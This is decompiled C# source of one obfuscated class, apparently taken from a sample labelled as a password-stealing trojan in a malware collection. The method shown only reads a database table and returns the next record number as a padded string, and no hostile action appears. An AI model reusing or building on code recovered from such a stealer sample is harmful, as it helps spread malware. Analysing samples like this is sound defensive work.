// Decompiled with JetBrains decompiler
// Type: Cx7o.Jz49
// Assembly: k3F4, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EF2862A8-7088-4F2B-ADD5-AFDC446098D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-ee71029a7b3d9d85e7a6c7c0ecc35d93ee37514713ba5033d491a0d7506e947b.exe

using e9H1;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.Linq;
using System.Linq;
using System.Linq.Expressions;
using x7X;

namespace Cx7o
{
  [StandardModule]
  internal sealed class Jz49
  {
    public static int Ⴈ = 1;

    public static string i2SA()
    {
      Table<Ex7f> ⴀ = new Tt1().Ⴀ;
      Expression body = (Expression) Expression.Parameter(typeof (Ex7f), "c");
      Expression<Func<Ex7f, Ex7f>> selector = Expression.Lambda<Func<Ex7f, Ex7f>>(body, (ParameterExpression) body);
      object list = (object) ⴀ.Select<Ex7f, Ex7f>(selector).ToList<Ex7f>();
      IComparable<string> comparable;
      try
      {
        comparable = (IComparable<string>) checked ((unchecked ((INotifyPropertyChanging) ((IEnumerable<Ex7f>) list).ElementAt<Ex7f>(checked ((list as List<Ex7f>).Count - 1))) as Ex7f).Ⴐ + 1).ToString("00000");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        comparable = (IComparable<string>) Jz49.Ⴈ.ToString("40000");
        ProjectData.ClearProjectError();
      }
      return comparable as string;
    }
  }
}
